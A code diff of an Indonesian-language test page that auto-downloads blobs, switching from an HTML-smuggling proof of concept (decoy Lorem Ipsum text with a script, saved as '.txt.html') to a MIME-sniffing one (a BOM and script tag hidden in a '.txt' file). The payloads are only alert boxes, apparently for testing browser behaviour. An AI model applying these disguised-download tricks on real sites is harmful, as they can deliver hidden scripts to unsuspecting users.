@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Smuggling dengan Lorem Ipsum</title>
+<title>MIME Sniffing TXT</title>
 <style>
 * { box-sizing: border-box; margin: 0; padding: 0; }
 body { font-family: Arial, sans-serif; background: #f4f6f8; color: #222; padding: 20px; }
@@ -22,8 +22,8 @@ button:hover { background: #b71c1c; }
 
 <body>
 <div class="panel" id="main-panel">
-<h2>HTML Smuggling - Lorem Ipsum</h2>
-<p>Mengunduh file .txt.html yang berisi teks "Lorem Ipsum" dan payload di bagian bawah.</p>
+<h2>MIME Sniffing TXT</h2>
+<p>Mengunduh file .txt yang berisi teks dan payload HTML di paling bawah.</p>
 
 <button id="start-btn" type="button">Mulai Generate Blob</button>
 <div id="status" role="status">Sistem siap.</div>
@@ -51,25 +51,20 @@ const speak = (message) => {
 const prepareMimeBlobAsync = (i) => {
     return new Promise((resolve) => {
         queueMicrotask(() => {
-            // Payload HTML dengan Lorem Ipsum di atas dan script alert di bawah
-            const payloadText = "<!DOCTYPE html>" +
-            "<html>" +
-            "<head><meta charset='UTF-8'><title>Dokumen Rahasia</title></head>" +
-            "<body style='margin:20px;font-family:sans-serif;'>" +
-            
-            // Bagian 1: Teks Lorem Ipsum (Agar terlihat seperti dokumen biasa)
-            "<h2>Lorem Ipsum Dolor Sit Amet</h2>" +
-            "<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.</p>" +
-            "<p>Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium, totam rem aperiam, eaque ipsa quae ab illo inventore veritatis et quasi architecto beatae vitae dicta sunt explicabo. Nemo enim ipsam voluptatem quia voluptas sit aspernatur aut odit aut fugit.</p>" +
-            "<p>At vero eos et accusamus et iusto odio dignissimos ducimus qui blanditiis praesentium voluptatum deleniti atque corrupti quos dolores et quas molestias excepturi sint occaecati cupiditate non provident.</p>" +
-            
-            // Bagian 2: Payload di Paling Bawah
-            "<script>alert(1)<\/script>" +
-            
-            "</body>" +
-            "</html>";
+            // Trik MIME Sniffing: Menyisipkan BOM UTF-8 dan tag HTML di dalam teks
+            // BOM (Byte Order Mark) \uFEFF sering memicu browser untuk melakukan sniffing sebagai HTML/XML
+            const payloadText = "\uFEFF" + 
+            "Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.\n" +
+            "Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.\n" +
+            "Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur.\n" +
+            "Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.\n" +
+            "\n" +
+            "<html><body>\n" +
+            "<script>alert('MIME Sniffing Berhasil!')<\/script>\n" +
+            "</body></html>";
           
-            const blob = new Blob([payloadText], { type: "text/html" });
+            // MIME type asli adalah text/plain
+            const blob = new Blob([payloadText], { type: "text/plain" });
             const url = URL.createObjectURL(blob);
             resolve({ id: i, url: url });
         });
@@ -80,10 +75,10 @@ const triggerInstantDownload = (fileData) => {
     const link = document.createElement("a");
     link.href = fileData.url;
     
-    // Ekstensi ganda .txt.html
-    link.download = `waguri-file-${fileData.id}.txt.html`;
+    // Nama file .txt
+    link.download = `dokumen-rahasia-${fileData.id}.txt`;
     
-    link.textContent = `Blob #${fileData.id} (.txt.html)`;
+    link.textContent = `Blob #${fileData.id} (.txt)`;
     link.style.display = "none";
     downloadsDiv.appendChild(link);
     link.click();
